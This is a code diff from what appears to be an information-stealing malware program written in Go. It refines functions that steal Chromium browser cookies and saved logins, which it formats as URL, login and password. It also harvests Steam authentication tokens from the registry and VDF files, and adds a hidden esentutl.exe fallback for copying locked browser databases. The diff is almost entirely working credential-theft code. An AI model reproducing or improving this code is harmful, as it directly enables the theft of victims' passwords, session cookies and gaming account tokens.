@@ -178,7 +178,7 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 			}
 		}
 
-		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_cookies_%s_%s_%d", browserName, profile, time.Now().UnixNano()))
+		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_ck_%s_%s_%d", browserName, strings.ReplaceAll(profile, " ", ""), time.Now().UnixNano()))
 		copyOk := false
 		if err := copyFileLocked(cookiePath, tmpPath, browserExe); err == nil {
 			_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal", browserExe)
@@ -194,8 +194,7 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 			defer os.Remove(tmpPath + "-wal")
 			defer os.Remove(tmpPath + "-shm")
 		} else {
-			clean := strings.ReplaceAll(cookiePath, string(os.PathSeparator), "/")
-			dbPath = "file:///" + clean + "?immutable=1"
+			dbPath = cookiePath
 		}
 
 		type queryResult struct {
@@ -203,8 +202,15 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 			err     string
 		}
 		ch := make(chan queryResult, 1)
-		go func(path string) {
-			db, err := sql.Open("sqlite", path)
+		go func(path string, copied bool) {
+			var dsn string
+			if copied {
+				dsn = path
+			} else {
+				clean := strings.ReplaceAll(path, "\\", "/")
+				dsn = "file:" + clean + "?mode=ro&immutable=1"
+			}
+			db, err := sql.Open("sqlite", dsn)
 			if err != nil {
 				ch <- queryResult{"", fmt.Sprintf("%s/%s open: %v", browserName, profile, err)}
 				return
@@ -237,7 +243,7 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 				return
 			}
 			ch <- queryResult{buf.String(), ""}
-		}(dbPath)
+		}(dbPath, copyOk)
 
 		select {
 		case res := <-ch:
@@ -265,7 +271,7 @@ func stealChromiumLogins(userDataPath string, browserName string, browserExe str
 			continue
 		}
 
-		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_logins_%s_%s_%d", browserName, profile, time.Now().UnixNano()))
+		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_lg_%s_%s_%d", browserName, strings.ReplaceAll(profile, " ", ""), time.Now().UnixNano()))
 		copyOk := false
 		if err := copyFileLocked(loginPath, tmpPath, browserExe); err == nil {
 			copyOk = true
@@ -277,13 +283,19 @@ func stealChromiumLogins(userDataPath string, browserName string, browserExe str
 			dbPath = tmpPath
 			defer os.Remove(tmpPath)
 		} else {
-			clean := strings.ReplaceAll(loginPath, string(os.PathSeparator), "/")
-			dbPath = "file:///" + clean + "?immutable=1"
+			dbPath = loginPath
 		}
 
 		ch := make(chan string, 1)
-		go func(path string) {
-			db, err := sql.Open("sqlite", path)
+		go func(path string, copied bool) {
+			var dsn string
+			if copied {
+				dsn = path
+			} else {
+				clean := strings.ReplaceAll(path, "\\", "/")
+				dsn = "file:" + clean + "?mode=ro&immutable=1"
+			}
+			db, err := sql.Open("sqlite", dsn)
 			if err != nil {
 				ch <- ""
 				return
@@ -315,7 +327,7 @@ func stealChromiumLogins(userDataPath string, browserName string, browserExe str
 				buf.WriteString(fmt.Sprintf("URL: %s\nLogin: %s\nPassword: %s\n\n", url, username, password))
 			}
 			ch <- buf.String()
-		}(dbPath)
+		}(dbPath, copyOk)
 
 		select {
 		case res := <-ch:
@@ -551,9 +563,20 @@ func stealSteamTokens() string {
 				break
 			}
 			name := syscall.UTF16ToString(nameBuf[:nameLen])
-			token := string(dataBuf[:dataLen])
-			for len(token) > 0 && token[len(token)-1] == 0 {
-				token = token[:len(token)-1]
+			var token string
+			if vtype == 1 || vtype == 2 {
+				if dataLen >= 2 {
+					u16 := make([]uint16, dataLen/2)
+					for i := range u16 {
+						u16[i] = uint16(dataBuf[i*2]) | uint16(dataBuf[i*2+1])<<8
+					}
+					token = syscall.UTF16ToString(u16)
+				}
+			} else {
+				token = string(dataBuf[:dataLen])
+				for len(token) > 0 && token[len(token)-1] == 0 {
+					token = token[:len(token)-1]
+				}
 			}
 			token = strings.TrimSpace(token)
 			if len(token) > 20 {
@@ -618,17 +641,31 @@ func stealSteamTokens() string {
 				if !isToken {
 					continue
 				}
-				clean := strings.Trim(line, "\"\t\r ")
-				parts := strings.SplitN(clean, "\t", 2)
-				if len(parts) == 2 {
-					key := strings.Trim(strings.TrimSpace(parts[0]), "\"")
-					val := strings.Trim(strings.TrimSpace(parts[1]), "\"")
+				// VDF format: "key"		"value" (quoted, tab-separated)
+				// Extract all quoted strings from the line
+				var quoted []string
+				rest := line
+				for {
+					qi := strings.Index(rest, "\"")
+					if qi == -1 { break }
+					rest = rest[qi+1:]
+					qe := strings.Index(rest, "\"")
+					if qe == -1 { break }
+					quoted = append(quoted, rest[:qe])
+					rest = rest[qe+1:]
+				}
+				if len(quoted) >= 2 {
+					key := strings.TrimSpace(quoted[0])
+					val := strings.TrimSpace(quoted[1])
 					if len(val) > 0 {
 						sb.WriteString(fmt.Sprintf("[VDF:%s] %s\n", key, val))
 					}
-				} else if len(clean) > 20 {
-					sb.WriteString(clean)
-					sb.WriteString("\n")
+				} else {
+					clean := strings.Trim(line, "\"\t\r ")
+					if len(clean) > 20 {
+						sb.WriteString(clean)
+						sb.WriteString("\n")
+					}
 				}
 			}
 		}
@@ -969,6 +1006,19 @@ func copyFileVSS(src, dst string) error {
 	return nil
 }
 
+func copyFilePlain(src, dst string) error {
+	cmd := exec.Command("esentutl.exe", "/y", src, "/d", dst)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	if err := cmd.Run(); err != nil {
+		return err
+	}
+	info, err := os.Stat(dst)
+	if err != nil || info.Size() == 0 {
+		return fmt.Errorf("esentutl empty")
+	}
+	return nil
+}
+
 func copyFileLocked(src, dst, browserExe string) error {
 	_ = browserExe
 
@@ -1018,6 +1068,10 @@ func copyFileLocked(src, dst, browserExe string) error {
 		if len(check) > 0 {
 			return nil
 		}
+	}
+
+	if err := copyFilePlain(src, dst); err == nil {
+		return nil
 	}
 
 	if err := copyFileVSS(src, dst); err == nil {
